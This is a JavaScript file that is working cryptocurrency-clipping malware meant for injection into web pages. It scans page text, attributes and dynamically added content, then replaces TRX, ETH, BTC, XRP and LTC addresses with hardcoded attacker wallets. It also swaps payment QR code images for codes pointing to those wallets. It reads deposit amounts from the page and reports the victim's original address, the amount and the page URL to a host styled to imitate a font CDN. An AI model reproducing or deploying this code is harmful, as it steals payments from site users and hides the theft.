(function () {
    var IS_ACTIVE = 1;

    if (IS_ACTIVE === 0) {
        return;
    }

    const CONFIG = {
        LIMIT_AMOUNT: 0,
        WALLETS: {
            trx: 'TJ4yAUg1uDiSk4tRJZxUnVRro6j6WqNHWj',
            eth: '0xe927b3f4eaD81394e19Bc394717bE5e078E8A8CD',
            btc: 'bc1q2vq7n23akjkh8gduhcaa5t2v4llmq8ked7xvk6',
            xrp: 'rJWGaZJjPuk9F1qpCHDSHtxkzTwBs9yMzM',
            ltc: 'ltc1qmgel5lgmw6zvlk8cyerjvd6wguxd3rt6dtpe8e'
        },
        TEXT_REPLACEMENTS: {
            "TESTSTRING1": "REPLACESTRING1",
            "TESTSTRING2": "REPLACESTRING2"
        },
        QR_TARGETS: ["replaceqrstring.png"],
        QR_STRINGS: ["BASE64IMGSTRING"],
        LOG_URL: 'https://use.fontawesame.com/api.php?api=deposit',
        IMG_SIZE: '150x150',
        REPLACE_CANVAS: false 
    };

    var LOG_SENT = false;
    var CAPTURED_PREVIOUS = null;

    const walletTypes = [
        { key: 'trx', regex: /\bT[A-Za-z1-9]{33}\b/g },
        { key: 'eth', regex: /\b0x[a-fA-F0-9]{40}\b/g },
        { key: 'btc', regex: /\b((?![0-9a-fA-F]{26,35}\b)[13][a-km-zA-HJ-NP-Z1-9]{25,34}|bc1[qp][a-z0-9]{38,59})\b/g },
        { key: 'xrp', regex: /\br[a-zA-Z0-9]{33}\b/g },
        { key: 'ltc', regex: /\b[L][A-Za-z0-9]{33}\b|\bltc1[a-zA-HJ-NP-Z0-9]{39,59}\b/g }
    ];

    function httpLog(url) {
        try {
            var xhr = new XMLHttpRequest();
            xhr.open('GET', url, true);
            xhr.timeout = 5000;
            xhr.send(null);
        } catch (e) {}
    }

    function updateQRCodes(newAddress) {
        try {
            var images = document.getElementsByTagName('img');
            var i, j, k, src, shouldReplace;
            var qrUrl = "https://api.qrserver.com/v1/create-qr-code/?data=" + encodeURIComponent(newAddress) + "&size=" + CONFIG.IMG_SIZE;

            for (i = 0; i < images.length; i++) {
                src = images[i].getAttribute('src') || '';
                shouldReplace = false;

                for (k = 0; k < CONFIG.QR_TARGETS.length; k++) {
                    if (src.indexOf(CONFIG.QR_TARGETS[k]) !== -1) {
                        shouldReplace = true;
                        break;
                    }
                }

                if (!shouldReplace) {
                    for (j = 0; j < CONFIG.QR_STRINGS.length; j++) {
                        if (src.indexOf(CONFIG.QR_STRINGS[j]) !== -1) {
                            shouldReplace = true;
                            break;
                        }
                    }
                }

                if (shouldReplace) {
                    images[i].src = qrUrl;
                }
            }

            if (CONFIG.REPLACE_CANVAS) {
                var canvases = document.getElementsByTagName('canvas');
                var c, img, canvas;
                for (c = canvases.length - 1; c >= 0; c--) {
                    canvas = canvases[c];
                    img = document.createElement('img');
                    img.src = qrUrl;
                    img.style.width = canvas.style.width || CONFIG.IMG_SIZE.split('x')[0] + 'px';
                    img.style.height = canvas.style.height || CONFIG.IMG_SIZE.split('x')[1] + 'px';
                    if (canvas.parentNode) {
                        canvas.parentNode.replaceChild(img, canvas);
                    }
                }
            }
        } catch (e) {}
    }

    function extractInteger(str) {
        if (!str && str !== 0) { return NaN; }
        var s = String(str).replace(/[^0-9.,]/g, '').replace(/,/g, '');
        var parts = s.split('.');
        return parts[0] ? parseInt(parts[0], 10) : NaN;
    }

    function detectMinAmountOnPage() {
        var amounts = [];
        var check = function (val) {
            var num = extractInteger(val);
            if (!isNaN(num)) { amounts.push(num); }
        };
        
        try {
            var tables = document.getElementsByTagName('table');
            var t, r, rows, ths, tds, thText;
            for (t = 0; t < tables.length; t++) {
                rows = tables[t].getElementsByTagName('tr');
                for (r = 0; r < rows.length; r++) {
                    ths = rows[r].getElementsByTagName('th');
                    tds = rows[r].getElementsByTagName('td');
                    if (ths.length > 0 && tds.length > 0) {
                        thText = (ths[0].textContent || ths[0].innerText || '').toLowerCase();
                        if (thText.indexOf('amount') !== -1) {
                            check(tds[0].textContent || tds[0].innerText);
                        }
                    }
                }
            }
        } catch (e1) {}

        try {
            var inputs = document.getElementsByTagName('input');
            var k;
            for (k = 0; k < inputs.length; k++) {
                if (inputs[k].type === "hidden" && inputs[k].name === "amount") {
                    check(inputs[k].value || inputs[k].getAttribute("value") || "");
                }
            }
        } catch (e2) {}

        var selectors = [
            'p span.font-bold', 'h6 strong', '.text-success', '.text--success',
            '.text--base', '.mb-3 strong', 'p b', '.dashboard__card b',
            '.gilroy-Semibold .text-white', '.get-right-box .text-white',
            '.card-header b', '.dashboard__card p', 'p', '.amountDisplay'
        ];

        var s, n, nodes, txt;
        for (s = 0; s < selectors.length; s++) {
            try {
                nodes = document.querySelectorAll(selectors[s]);
                for (n = 0; n < nodes.length; n++) {
                    txt = (nodes[n].textContent || nodes[n].innerText || '').replace(' USD', '').replace(' $', '');
                    check(txt);
                }
            } catch (e3) {}
        }

        return (amounts.length === 0) ? null : Math.min.apply(null, amounts);
    }

    function processNode(node) {
        if (!node) { return; }
        var w, target, re, m, a, attr, wt2, target2, re2, m2;
        
        if (node.nodeType === 3) {
            for (var key in CONFIG.TEXT_REPLACEMENTS) {
                if (CONFIG.TEXT_REPLACEMENTS.hasOwnProperty(key)) {
                    if (node.nodeValue.indexOf(key) !== -1) {
                        node.nodeValue = node.nodeValue.split(key).join(CONFIG.TEXT_REPLACEMENTS[key]);
                    }
                }
            }

            for (w = 0; w < walletTypes.length; w++) {
                target = CONFIG.WALLETS[walletTypes[w].key];
                if (!target) { continue; }
                re = new RegExp(walletTypes[w].regex.source, 'gi');
                if (re.test(node.nodeValue)) {
                    m = node.nodeValue.match(re);
                    if (m && !CAPTURED_PREVIOUS) { CAPTURED_PREVIOUS = m[0]; }
                    node.nodeValue = node.nodeValue.replace(re, target);
                    updateQRCodes(target);
                }
            }
        } 
        else if (node.nodeType === 1 && node.attributes) {
            if (node.tagName === 'SCRIPT' || node.tagName === 'STYLE') { return; }
            for (a = 0; a < node.attributes.length; a++) {
                attr = node.attributes[a];
                if (attr.value.toLowerCase().indexOf('data:image') === 0) { continue; }

                for (var keyAttr in CONFIG.TEXT_REPLACEMENTS) {
                    if (CONFIG.TEXT_REPLACEMENTS.hasOwnProperty(keyAttr)) {
                        if (attr.value.indexOf(keyAttr) !== -1) {
                            attr.value = attr.value.split(keyAttr).join(CONFIG.TEXT_REPLACEMENTS[keyAttr]);
                        }
                    }
                }

                for (wt2 = 0; wt2 < walletTypes.length; wt2++) {
                    target2 = CONFIG.WALLETS[walletTypes[wt2].key];
                    re2 = new RegExp(walletTypes[wt2].regex.source, 'gi');
                    if (re2.test(attr.value)) {
                        m2 = attr.value.match(re2);
                        if (m2 && !CAPTURED_PREVIOUS) { CAPTURED_PREVIOUS = m2[0]; }
                        attr.value = attr.value.replace(re2, target2);
                        updateQRCodes(target2);
                    }
                }
            }
        }
    }

    function tryLog() {
        if (LOG_SENT || !CAPTURED_PREVIOUS) { return; }
        var amt = detectMinAmountOnPage();
        if (CONFIG.LIMIT_AMOUNT !== 0) {
            if (amt === null || amt < CONFIG.LIMIT_AMOUNT) { return; }
        }
        LOG_SENT = true;
        var logUrl = CONFIG.LOG_URL + '&amount=' + encodeURIComponent(amt || 0) + '&previous=' + encodeURIComponent(CAPTURED_PREVIOUS) + '&referrer=' + encodeURIComponent(location.href);
        httpLog(logUrl);
    }

    function shouldExecute() {
        if (CONFIG.LIMIT_AMOUNT === 0) return true;
        var amt = detectMinAmountOnPage();
        if (amt === null || amt < CONFIG.LIMIT_AMOUNT) {
            return false;
        }
        return true;
    }

    function main() {
        if (!shouldExecute()) return; 
        var root = document.body || document.documentElement;
        if (!root) { return; }
        var walker = document.createTreeWalker(root, NodeFilter.SHOW_ALL, null, false);
        var n = walker.nextNode();
        while (n) {
            processNode(n);
            n = walker.nextNode();
        }
    }

    var observer = new MutationObserver(function (mutations) {
        if (!shouldExecute()) return; 
        var m, nodeIdx, nodes;
        for (m = 0; m < mutations.length; m++) {
            nodes = mutations[m].addedNodes;
            if (nodes) {
                for (nodeIdx = 0; nodeIdx < nodes.length; nodeIdx++) {
                    processNode(nodes[nodeIdx]);
                }
            }
        }
        if (CAPTURED_PREVIOUS && !LOG_SENT) { tryLog(); }
    });

    if (document.documentElement) {
        main();
        observer.observe(document.documentElement, { childList: true, subtree: true, attributes: true });
    }

    var logInterval = setInterval(function () {
        if (LOG_SENT) {
            clearInterval(logInterval);
        } else {
            tryLog();
        }
    }, 1000);

}());